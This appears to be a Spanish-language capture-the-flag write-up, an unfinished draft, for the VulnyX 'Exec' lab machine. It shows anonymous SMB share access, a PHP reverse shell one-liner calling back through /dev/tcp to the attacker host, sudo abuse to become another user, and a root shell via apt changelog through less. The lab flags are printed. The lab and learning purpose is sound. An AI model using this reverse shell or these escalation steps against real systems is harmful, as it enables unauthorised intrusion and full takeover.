
### WRITEUP - VULNYX - EXEC ##
<!--
## Scanning Network ##
netdiscover -r 10.0.2.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                                    
                                                                                                                  
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                 
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                 
 10.0.2.3        08:00:27:8f:22:b9      1      60  PCS Systemtechnik GmbH                                         
 10.0.2.7        08:00:27:15:3c:0d      1      60  PCS Systemtechnik GmbH 


first nmap
nmap services
	$ smb(smbd 4.6.2), http (apache 2.4.57 misma CVE que en Hacking station), ssh, netbios
## Enumeration ##
nmap netbios
	$ nmap -p139,445 --script nbstat 10.0.2.7
smb client
	$ smbclient -L //10.0.2.7 -U "" -N > enumeration/smbclient_list
Probamos a conectarnos a algúno de los shares con contraseña en blanco. Lo conseguimos en el share server
	$ smbclient //10.0.2.7/server -U ""
	Password for [WORKGROUP\]:
	Try "help" to get a list of possible commands.
	smb: \> 
Podemos listar el directorio y vemos un index.html. Tiene pinta que aquí es donde se hostea el servicio web 
	smb: \> ls
	  .                                   D        0  Mon Apr 15 04:45:54 2024
	  ..                                  D        0  Mon Apr 15 04:04:12 2024
	  index.html                          N    10701  Mon Apr 15 04:04:31 2024

	                19480400 blocks of size 1024. 16499224 blocks available
Esto lo tendremos en cuenta para poder introducir una reverse shell
Procedemos a enumerar smb con enum4linux -r 10.0.2.7 mientras miramos el servicio web
En el servicio web nos encontramos la págia por defecto de un servicio apache, por lo que poco podemos hacer.
~~Imagen servicio web~~
Mientras revisamos el enum4linux, podemos ir tirando un dirbuster y recoger posibles rutas adicionales en el servicio
web
	$ dirb http://10.0.2.7:80
Nada interesante en el dirbuster
pero en el enum4linux, obtenemos un usuario llamado s3cur4.

### Weaponization/Gaining access ###
Ya que tenemos un acceso por un share, vamos a probar a copiarnos una reverse shell en php por ejemplo y probar a ejecutarla
Vamos a montarnos una particion para poder realizar las acciones necesarias de forma más sencilla
	$ mkdir /mnt/Exec
	$ mount -t cifs -o user="" -o password="" //10.0.2.7/server /mnt/Exec
Creamos el script, lo copiamos y nos ponemos a la escucha:
	$ cp reverse_shell.php /mnt/Exec
	<?php exec("bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'");?>
	$ nc -nlvp 443
Una vez hecho esto vamos a ver si se carga en el servidor y ejecuta nuestro script php
~~Imagen reverse shell~~
Tenemos acceso al servidor. Ahora vamos a tratar la shell:
~~Copiar de otros md el tratamiento de shell~~
### Privilege escalation ###
Vemos que somos www-data y que no tenemos permisos aparentes
	www-data@exec:/var/www/html$ whoami
	www-data
	www-data@exec:/var/www/html$ id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
Por el enum4linux lanzado anteriormente, sabemos que existe un usuario local llamado s3cur4 pero no tenemos acceso
a su home para obtener la flag:
	www-data@exec:/var/www/html$ ls -la /home/s3cur4/
	ls: cannot open directory '/home/s3cur4/': Permission denied
Viendo si tenemos permisos con sudo, podemos ver que tenemos acceso a una bash siendo s3cur4:
	www-data@exec:/var/www/html$ sudo -l
		Matching Defaults entries for www-data on exec:
    			env_reset, mail_badpass,
    			secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    			use_pty

		User www-data may run the following commands on exec:
    			(s3cur4) NOPASSWD: /usr/bin/bash
Podemos abusar de este permiso con www-data y que nos devuelva una bash:
	sudo -u s3cur4 /bin/bash
Obtenemos una shell como s3cur4
	www-data@exec:/var/www/html$ sudo -u s3cur4 /bin/bash
	s3cur4@exec:/var/www/html$ whoami
	s3cur4
Una vez dentro como el usuario, buscamos y obtenemos la flag:
	s3cur4@exec:/var/www/html$ ls -la /home/s3cur4/
	total 28
	drwx------ 3 s3cur4 s3cur4 4096 Apr 15 10:56 .
	drwxr-xr-x 3 root   root   4096 Apr 15 09:56 ..
	lrwxrwxrwx 1 root   root      9 Apr 15 10:53 .bash_history -> /dev/null
	-rw-r--r-- 1 s3cur4 s3cur4  220 Nov 15 10:23 .bash_logout
	-rw-r--r-- 1 s3cur4 s3cur4 3526 Nov 15 10:23 .bashrc
	drwxr-xr-x 3 s3cur4 s3cur4 4096 Apr 15 10:17 .local
	-rw-r--r-- 1 s3cur4 s3cur4  807 Nov 15 10:23 .profile
	-r-------- 1 s3cur4 s3cur4   33 Apr 15 10:56 user.txt
	s3cur4@exec:/var/www/html$ cat /home/s3cur4/user.txt 
	45e398cc820ab08df0e3a414eac58fef
Ahora, procederemos a escalar a root.
Identificamos los permisos del usuario sobre sudo.
s3cur4@exec:/var/www/html$ sudo -l
	Matching Defaults entries for s3cur4 on exec:
    	env_reset, mail_badpass,
    	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    	use_pty

	User s3cur4 may run the following commands on exec:
    		(root) NOPASSWD: /usr/bin/apt
Observamos que tenemos permisos para ejecutar un binario llamado : */usr/bin/apt*. Analizamos el comportamiento de
este binario
	s3cur4@exec:/var/www/html$ sudo /usr/bin/apt
	apt 2.6.1 (amd64)
	Usage: apt [options] command

	apt is a commandline package manager and provides commands for
	searching and managing as well as querying information about packages.
	It provides the same functionality as the specialized APT tools,
	like apt-get and apt-cache, but enables options more suitable for
	interactive use by default.

	Most used commands:
	  list - list packages based on package names
	  search - search in package descriptions
	  show - show package details
	  install - install packages
	  reinstall - reinstall packages
	  remove - remove packages
	  autoremove - automatically remove all unused packages
	  update - update list of available packages
	  upgrade - upgrade the system by installing/upgrading packages
	  full-upgrade - upgrade the system by removing/installing/upgrading packages
	  edit-sources - edit the source information file
	  satisfy - satisfy dependency strings

	See apt(8) for more information about the available commands.
	Configuration options and syntax is detailed in apt.conf(5).
	Information about how to configure sources can be found in sources.list(5).
	Package and version choices can be expressed via apt_preferences(5).
	Security details are available in apt-secure(8).
	                                        This APT has Super Cow Powers.
Buscamos alguna forma de vulnerar el sistema con este comando. Dentro de GTFOBins, tenemos una entrada de *apt*
~~Captura apt entrada~~
Y observamos que podemos obtener una shell como root siguiendo los siguientes pasos:
~~Captura sudo~~
Vamos a probar a utilizar el bypass por el changelog (como less) para obtener una shell como root. Para esto, usamos
el comando indicado y luego, dentro de la visualización con less, podemos escribir y ejecutar *!/bin/bash*

De esta forma obtenemos el acceso como root
	s3cur4@exec:/var/www/html$ sudo apt changelog apt
	Get:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB]
	Fetched 505 kB in 0s (1601 kB/s)
	root@exec:/var/www/html# whoami
	root
Una vez ya con acceso a root, tenemos control total de la máquina. Obtenemos el flag de root:
	root@exec:/var/www/html# ls -la /root/
	total 32
	drwx------  4 root root 4096 Apr 21 20:45 .
	drwxr-xr-x 18 root root 4096 Apr 15 09:48 ..
	lrwxrwxrwx  1 root root    9 Apr 15 10:53 .bash_history -> /dev/null
	-rw-r--r--  1 root root 3526 Apr 15 10:05 .bashrc
	-rw-------  1 root root   38 Apr 21 20:45 .lesshst
	drwxr-xr-x  3 root root 4096 Apr 15 09:57 .local
	-rw-r--r--  1 root root  161 Jul  9  2019 .profile
	drwx------  2 root root 4096 Apr 15 11:21 .ssh
	-r--------  1 root root   33 Apr 15 10:54 root.txt
	root@exec:/var/www/html# cat /root/root.txt 
	97d8adddb3a3aa8b63e28c2396c5e53f
-->
